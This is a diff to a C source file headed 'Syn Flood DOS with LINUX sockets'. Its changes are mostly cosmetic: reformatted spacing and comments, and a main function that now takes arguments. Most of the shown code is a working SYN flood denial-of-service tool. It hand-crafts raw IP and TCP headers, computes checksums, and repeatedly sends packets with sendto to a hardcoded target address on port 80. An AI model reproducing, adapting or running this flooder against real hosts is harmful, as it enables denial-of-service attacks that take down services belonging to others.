@@ -1,6 +1,6 @@
 /*
-	Syn Flood DOS with LINUX sockets
-*/
+ * Syn Flood DOS with LINUX sockets
+ */
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -26,7 +26,7 @@ int createSocket(void);
 void attack(const char* dest_ip, int dest_port);
 unsigned short csum(unsigned short *ptr, int nbytes);
 
-int main (void) {
+int main (int argc, char *argv[]) {
 	const char* dest_ip = "10.202.82.90";
 	int dest_port = 80;
 
@@ -67,10 +67,10 @@ void attack(const char* dest_ip, int dest_port) {
 	char* datagram = new char[4096];
 
 	//IP header
-	struct iphdr *iph = (struct iphdr *) datagram;
+	struct iphdr *iph = (struct iphdr *)datagram;
 
 	//TCP header
-	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
+	struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof (struct ip));
 
 	//sockaddr_in is used to create socket on this computer
 	//iphdr, tcphdr is data that actually send via the socket
@@ -84,7 +84,7 @@ void attack(const char* dest_ip, int dest_port) {
 	iph->version = 4;
 	iph->ihl = 5;
 	iph->tos = 0;
-	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
+	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
 	iph->frag_off = 0;
 	iph->ttl = 255;
 	iph->protocol = IPPROTO_TCP;
@@ -121,7 +121,7 @@ void attack(const char* dest_ip, int dest_port) {
 		iph->check = 0;
 
 		//checksum
-		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+		iph->check = csum((unsigned short*)datagram, iph->tot_len >> 1);
 		
 		//TCP Header
 		tcph->source = sin.sin_port;
@@ -132,30 +132,30 @@ void attack(const char* dest_ip, int dest_port) {
 		psh.source_address = iph->saddr;
 		memcpy(&psh.tcp , tcph , sizeof(struct tcphdr));
 
-		tcph->check = csum((unsigned short*) &psh, sizeof(struct pseudo_header));
+		tcph->check = csum((unsigned short*)&psh, sizeof(struct pseudo_header));
 
-		sendto(fd, datagram, iph->tot_len, MSG_DONTWAIT, (struct sockaddr *) &sin, sizeof(struct sockaddr_in));
+		sendto(fd, datagram, iph->tot_len, MSG_DONTWAIT, (struct sockaddr*)&sin, sizeof(struct sockaddr_in));
 	}
 }
 
 unsigned short csum(unsigned short *ptr, int nbytes) {
 	register long sum = 0;
-	unsigned short oddbyte;
 	register short answer;
 
-	while(nbytes>1) {
-		sum+=*ptr++;
-		nbytes-=2;
+	while(nbytes > 1) {
+		sum += *ptr++;
+		nbytes -= 2;
 	}
-	if(nbytes==1) {
-		oddbyte=0;
-		*((u_char*)&oddbyte)=*(u_char*)ptr;
-		sum+=oddbyte;
+
+	if(nbytes == 1) {
+		unsigned short oddbyte = 0;
+		*((u_char*)&oddbyte) = *(u_char*)ptr;
+		sum += oddbyte;
 	}
  
-	sum = (sum>>16)+(sum & 0xffff);
+	sum = (sum>>16) + (sum & 0xffff);
 	sum = sum + (sum>>16);
-	answer=(short)~sum;
+	answer = (short)~sum;
 	 
 	return(answer);
 }
